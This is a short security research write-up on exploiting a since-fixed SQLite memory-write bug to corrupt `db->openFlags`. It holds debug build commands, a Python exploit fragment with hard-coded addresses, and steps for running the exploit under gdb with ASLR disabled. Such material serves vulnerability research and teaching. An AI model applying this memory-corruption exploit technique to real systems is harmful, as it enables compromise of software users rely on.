# Corrupting `isDelete` to Attack `SQLite`

## Attack via Real-world (Fixed) Bugs

### 1. Gain arbitrary memory-write primitive

We reuse the [bug](./cve-2017-6983.md) for achieving arbitrary memory write.

#### 2. Compile SQLite

```bash
# in sqlite folder

CC="clang -DSQLITE_DEBUG" ./configure --enable-debug
make
```

### 3. Proof-of-Concept (PoC)

We need to corrupt `db->openFlags`. We disabled ASLR in this attack, so the addresses of `p` and faked structures are fixed. Bypassing ASLR is also feasible as demonstrated in page 60 of the slides. The complete PoC can be found in [isDelete-poc.py](./isDelete-poc.py).

```py
# The address of openFlags
openFlags = 0x651a6c
# set zMalloc in sqlite3_value
exp = writeVal(exp, sqlite3_value_off + 0x40, openFlags, 8)
# set the value of openFlags
exp = writeVal(exp, src_off, 0x100e, 4)
```

```bash
# clean up sqlite cache
$ rm -rf ~/.sqlite*

# generate the exploit poc
$ ./isDelete-exp.py

# exploit it with gdb
$ gdb ./sqlite3
(gdb) r < /tmp/exp
```
